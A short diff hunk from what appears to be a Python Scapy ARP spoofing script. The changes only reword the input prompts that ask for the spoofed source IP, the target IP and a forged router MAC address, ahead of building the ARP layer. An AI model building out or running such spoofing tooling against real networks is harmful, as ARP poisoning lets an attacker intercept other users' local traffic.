@@ -7,10 +7,10 @@ broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
 # broadcast.show()
 
 # Defining spoof target
-spoof_target = input('Enter spoof src addr\nThis is usually the Route\'s IP [192.168.2.1]: ')
+spoof_target = input('Enter spoof src IP [192.168.2.1]: ')
 target_IP = input('Enter target\'s IP [192.168.2.65]: ')
 # Falsifying Router's MAC address
-router_mac_addr = input('Enter preferred Router\'s MAC addr [00:50:56:fu:ck:yu]: ')
+router_mac_addr = input('Enter preferred Spoofing MAC addr [00:50:56:fu:ck:yu]: ')
 # Entering Router's IP addr
 #router_IP = input('Enter Router\'s IP [192.168.2.1]: ')
 # Crafting the ARP layer
